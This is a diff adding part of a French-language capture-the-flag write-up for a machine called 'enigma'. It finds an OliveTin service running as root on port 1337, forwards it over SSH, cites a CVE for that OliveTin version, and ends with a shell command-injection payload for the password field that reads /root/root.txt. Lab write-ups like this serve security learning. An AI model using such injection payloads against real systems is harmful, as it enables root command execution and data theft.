@@ -295,3 +295,30 @@ udp6       0      0 :::56421                :::*
 udp6       0      0 :::46836                :::*                               
 udp6       0      0 :::53265                :::* 
 ```
+
+on peut voir qu'il y a quelque chose qui utilise le port 1337 et si on curl on trouve un site web qui s'appelle OliveTin
+
+Si on fait un 
+
+```bash
+haris@enigma:~$ ps aux| grep OliveTin
+root        1543  0.0  0.4 1239312 17108 ?       Ssl  13:25   0:00 /usr/local/bin/OliveTin
+haris       2119  0.0  0.0   7080  2128 pts/2    S+   13:38   0:00 grep --color=auto OliveTin
+haris@enigma:~$ 
+```
+
+On peut voir que OliveTin tourne en root (peut etre notre porte d'entrée)
+
+On peut monter un tunnel via ssh pour avoir accès au port 1337 depuis la kali
+
+```bash
+ssh -L 1337:127.0.0.1:1337 haris@enigma.htb
+```
+
+On peut voir qu'on a un olivetin version 3000.10.0, il existe une cve (CVE-2026-27626)
+
+On peut lire dans la CVE que le champs de password n'est pas suffisament protéger et qu'on peut faire des injection, donc si on rentre
+
+```
+a'; cat /root/root.txt; #
+```
